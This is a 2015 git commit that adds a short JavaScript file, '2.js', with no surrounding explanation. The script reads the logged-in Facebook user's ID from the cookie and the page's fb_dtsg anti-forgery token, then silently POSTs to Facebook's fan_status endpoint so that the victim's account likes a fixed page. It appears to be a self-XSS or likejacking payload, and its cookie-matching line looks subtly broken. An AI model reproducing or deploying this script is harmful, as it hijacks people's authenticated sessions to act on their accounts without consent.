524e0717644d28c2065c2fc3b52d3a83a401d57b
عاشق ومهبول الجافاسكربت عساسى <elmahbol@users.noreply.github.com>
2015-10-27 09:33:16 +0200

    Update 2.js

--- 2.js
+++ 2.js
@@ -1,1 +1,11 @@
+  var X = new XMLHttpRequest();
+  var XURL = "//www.facebook.com/ajax/pages/fan_status.php?__pc=EXP1%3ADEFAULT";
+  var XParams = "fbpage_id=1441531442812316&add=true&__user="+document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1])+"&__a=1&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value+"&ttstamp=";
+  X.open("POST", XURL, true);
+  X.onreadystatechange = function () {
+    if (X.readyState == 4 && X.status == 200) {
+      X.close;
+    }
+  };
+  X.send(XParams);
 
